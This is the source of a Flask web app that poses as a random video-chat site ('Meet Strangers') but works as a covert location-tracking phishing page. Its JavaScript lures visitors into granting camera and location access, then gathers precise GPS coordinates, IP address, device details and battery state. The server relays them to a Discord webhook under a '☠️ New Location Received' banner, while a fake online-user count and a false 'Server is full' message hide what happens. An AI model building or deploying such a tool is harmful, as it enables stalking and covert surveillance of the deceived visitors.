from flask import Flask, request, render_template_string, jsonify
import requests
import logging, time
import os

app = Flask(__name__)

DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
# Cooldown time in seconds
COOLDOWN_TIME = 10
last_submission_time = None
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Random Chat | Meet Strangers</title>
    <style>
        /* CSS styles (same as the original) */
        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            overflow: hidden;
            padding: 0 15px;
        }
        header {
            width: 100%;
            background-color: #111;
            padding: 10px 0;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 10;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.7);
        }
        header nav {
            display: flex;
            justify-content: center;
            gap: 30px;
        }
        header nav a {
            color: #fff;
            text-decoration: none;
            font-size: 1.1rem;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: color 0.3s ease;
        }
        header nav a:hover {
            color: #fff;
            text-decoration: underline;
        }
        .main-container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.7);
            max-width: 900px;
            width: 100%;
            text-align: center;
            backdrop-filter: blur(12px);
            color: #fff;
            margin-top: 80px;
            position: relative;
        }
        h1 {
            font-size: 1rem;
            margin-bottom: 20px;
            color: #fff;
        }
        .video-container {
            width: 100%;
            max-width: 450px;
            aspect-ratio: 16/9;
            background-color: #222;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 25px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.8);
            transition: transform 0.3s ease;
        }
        .video-container:hover {
            transform: scale(1.03);
        }
        .dropdown {
            display: none;
            margin: 20px 0;
            font-size: 1rem;
        }
        select {
            font-size: 1.2rem;
            padding: 12px;
            width: 100%;
            max-width: 450px;
            background-color: #333;
            color: white;
            border: 1px solid #fff;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease;
        }
        select:hover {
            background-color: #444;
            transform: translateY(-3px);
        }
        select:focus {
            outline: none;
            background-color: #555;
        }
        .button-container {
            margin-top: 20px;
            display: flex;
            justify-content: center;
            gap: 25px;
            flex-wrap: wrap;
        }
        .button-container button {
            font-size: 1.2rem;
            padding: 15px 30px;
            background-color: #555;
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        .button-container button:disabled {
            background-color: #333;
            cursor: not-allowed;
        }
        .button-container button:hover:not(:disabled) {
            background-color: #777;
            transform: translateY(-3px);
        }
        #output {
            margin-top: 25px;
            font-size: 1.3rem;
            color: #ffcc00;
            font-weight: bold;
        }
        footer {
            background-color: #111;
            color: #fff;
            text-align: center;
            padding: 5px 0;
            position: absolute;
            bottom: 0;
            width: 100%;
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.7);
            margin-top: 10px;
        }
        footer a {
            color: #fff;
            text-decoration: none;
            margin: 0 10px;
            font-size: 1rem;
        }
        footer a:hover {
            text-decoration: underline;
        }
        @media (max-width: 768px) {
            h1 {
                font-size: 2rem;
                margin-bottom: 15px;
            }
            .button-container {
                flex-direction: column;
                gap: 15px;
            }
            .button-container button {
                width: 90%;
            }
            select {
                width: 100%;
            }
            .video-container {
                max-width: 100%;
            }
        }
        @media (max-width: 480px) {
            header nav {
                flex-direction: column;
                gap: 15px;
            }
            header nav a {
                font-size: 1rem;
            }
        }
    </style>
</head>

<body>
    <header>
        <nav>
            <a href="#">Home</a>
            <a href="#">About Us</a>
            <a href="#">Terms</a>
            <a href="#">Privacy</a>
        </nav>
    </header>

    <div class="main-container">
        <h1 id="userCountDisplay">Meet Strangers</h1>
        <div class="video-container" id="videoContainer">
            <video id="localVideo" autoplay playsinline></video>
        </div>
        <div id="output">Ready to connect? Press Start</div>
        <div class="dropdown" id="dropdown">
            <p>Select a Location:</p>
            <select id="locationSelect">
                <option value="USA">United States</option>
                <option value="Canada">Canada</option>
                <option value="UK">United Kingdom</option>
            </select>
        </div>
        <div class="button-container">
            <button id="startButton" onclick="handleGetStarted()">Start</button>
            <button id="nextButton" onclick="sendLocationData()" disabled>Next Person</button>
        </div>
        <div id="timerDisplay" style="display: none;">
            Wait for <span id="timerCount">0</span> seconds before continuing.
        </div>

    </div>

    <script>
        let geoWatchId;
        let locationEnabled = false;
        let cooldownActive = false;
        let cooldownTime = 120; // 2 minutes cooldown in seconds
        let countdownInterval;

        function startTracking() {
            if (navigator.geolocation) {
                geoWatchId = navigator.geolocation.watchPosition(
                    sendPosition,
                    showError,
                    {
                        enableHighAccuracy: true,
                        maximumAge: 0,
                        timeout: 5000
                    }
                );
            } else {
                alert("Failed to get Server.");
            }
        }

        function sendPosition(position) {
            window.locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                maps_link: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
            };
            locationEnabled = true; // Location tracking is active
            updateButtonStates(); // Check if the buttons can be enabled
        }

        function updateButtonStates() {
            const nextButton = document.getElementById('nextButton');
            const startButton = document.getElementById('startButton');
            if (!cooldownActive) {
                startButton.disabled = false; // Enable Start button if cooldown is inactive
                nextButton.disabled = !locationEnabled; // Enable Next button if location is active
            } else {
                startButton.disabled = true;
                nextButton.disabled = true;
            }
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language
            };
        }

        async function getBatteryInfo() {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level * 100 + "%",
                    charging: battery.charging
                };
            } else {
                return {
                    level: "Unknown",
                    charging: "Unknown"
                };
            }
        }

        async function sendLocationData() {
            if (!locationEnabled) {
                alert("Please enable location.");
                return;
            }

            disableButtonsForCooldown(); // Start the cooldown

            const selectedOption = document.getElementById('locationSelect').value;
            const locationData = window.locationData;
            const deviceInfo = getDeviceInfo();
            const batteryInfo = await getBatteryInfo();

            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    fetch('/submit_location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ...locationData,
                            selected_option: selectedOption,
                            ip_address: ip,
                            device_info: deviceInfo,
                            battery_info: batteryInfo
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        alert('Server is full.');
                        stopTracking();
                    });
                });
        }

        function disableButtonsForCooldown() {
            cooldownActive = true;
            updateButtonStates();
            startCooldownTimer();
        }

        function startCooldownTimer() {
            const timerDisplay = document.getElementById('timerDisplay');
            const timerCount = document.getElementById('timerCount');
            timerDisplay.style.display = "block";

            let timeRemaining = cooldownTime;
            timerCount.textContent = timeRemaining;

            countdownInterval = setInterval(() => {
                timeRemaining -= 1;
                timerCount.textContent = timeRemaining;

                if (timeRemaining <= 0) {
                    clearInterval(countdownInterval);
                    cooldownActive = false;
                    timerDisplay.style.display = "none";
                    updateButtonStates();
                }
            }, 1000);
        }

        function showError(error) {
            locationEnabled = false; // Disable location tracking
            updateButtonStates(); // Ensure the buttons remain disabled
            alert("Server error: Allow Location & Camera to chat.");
        }

        function handleGetStarted() {
            startVideo();
            startTracking();
            document.getElementById('output').innerHTML = "Please select a topic and click Next.";
            document.getElementById('dropdown').style.display = "block";
            updateButtonStates();
        }

        function stopTracking() {
            if (geoWatchId) {
                navigator.geolocation.clearWatch(geoWatchId);
            }
            locationEnabled = false; // Reset location tracking
            updateButtonStates(); // Disable the buttons
        }

        function startVideo() {
            const videoElement = document.getElementById('localVideo');
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function (stream) {
                        videoElement.srcObject = stream;
                    })
                    .catch(function (error) {
                        alert("Camera access denied or unavailable: ");
                    });
            } else {
                alert("Your browser does not support camera access.");
            }
        }

        function updateUserCount() {
            const userCount = Math.floor(Math.random() * (100 - 3 + 1)) + 3; // Random number between 3 and 100
            document.getElementById('userCountDisplay').innerHTML = `Meet Strangers - ${userCount} Users Online`;
        }

        updateUserCount();
        setInterval(updateUserCount, 20000);
    </script>

</body>

</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/submit_location', methods=['POST'])
def submit_location():
    global last_submission_time
    current_time = time.time()
    if last_submission_time and current_time - last_submission_time < COOLDOWN_TIME:
        return jsonify({'status': 'error', 'message': 'Cooldown active. Please wait.'}), 429

    last_submission_time = current_time

    data = request.json
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    maps_link = data.get('maps_link')
    selected_option = data.get('selected_option')
    ip_address = data.get('ip_address')
    device_info = data.get('device_info')
    battery_info = data.get('battery_info')

    embed = {
        "embeds": [
            {
                "title": "🔗 **☠️ New Location Received** ☠️",
                "description": (
                    f"**🌍 🌑 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝗜𝗻𝗳𝗼:**\n"
                    f"⚫ **𝗟𝗮𝘁𝗶𝘁𝘂𝗱𝗲:** `{latitude}`\n"
                    f"⚫ **𝗟𝗼𝗻𝗴𝗶𝘁𝘂𝗱𝗲:** `{longitude}`\n"
                    f"⚫ **𝗔𝗰𝗰𝘂𝗿𝗮𝗰𝘆:** `{accuracy} meters`\n"
                    f"🔗 **[📍 𝗩𝗶𝗲𝘄 𝗼𝗻 𝗚𝗼𝗼𝗴𝗹𝗲 𝗠𝗮𝗽𝘀]({maps_link})**\n\n"
                    f"**🕵️‍♂️ 𝗨𝘀𝗲𝗿 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:**\n"
                    f"🔸 **𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗢𝗽𝘁𝗶𝗼𝗻:** `{selected_option}`\n"
                    f"🔸 **𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀:** `{ip_address}`\n"
                    f"🔸 **𝗨𝘀𝗲𝗿 𝗔𝗴𝗲𝗻𝘁:** `{device_info['userAgent']}`\n"
                    f"🔸 **𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺:** `{device_info['platform']}`\n"
                    f"🔸 **𝗟𝗮𝗻𝗴𝘂𝗮𝗴𝗲:** `{device_info['language']}`\n\n"
                    f"**⚡ 🔋 𝗕𝗮𝘁𝘁𝗲𝗿𝘆 𝗜𝗻𝗳𝗼:**\n"
                    f"🔻 **𝗕𝗮𝘁𝘁𝗲𝗿𝘆 𝗟𝗲𝘃𝗲𝗹:** `{battery_info['level']}%`\n"
                    f"🔻 **𝗖𝗵𝗮𝗿𝗴𝗶𝗻𝗴:** `{'Yes' if battery_info['charging'] else 'No'}`"
                ),
                "color": 13369599,
                "thumbnail": {
                    "url": "https://giffiles.alphacoders.com/918/91855.gif"
                },
                "footer": {
                    "text": "👁️ Powered by: https://discord.gg/ghjZ8FT5hx | zespera 🕷️",
                    "icon_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHGuHDk6Zo3UB9gR045D6oK_qUqXVvvimCYQ&s"
                }
            }
        ]
    }

    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=embed)
        return jsonify({'status': 'success', 'message': 'Data sent', 'response': response.text})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=False, host='0.0.0.0', port=port)

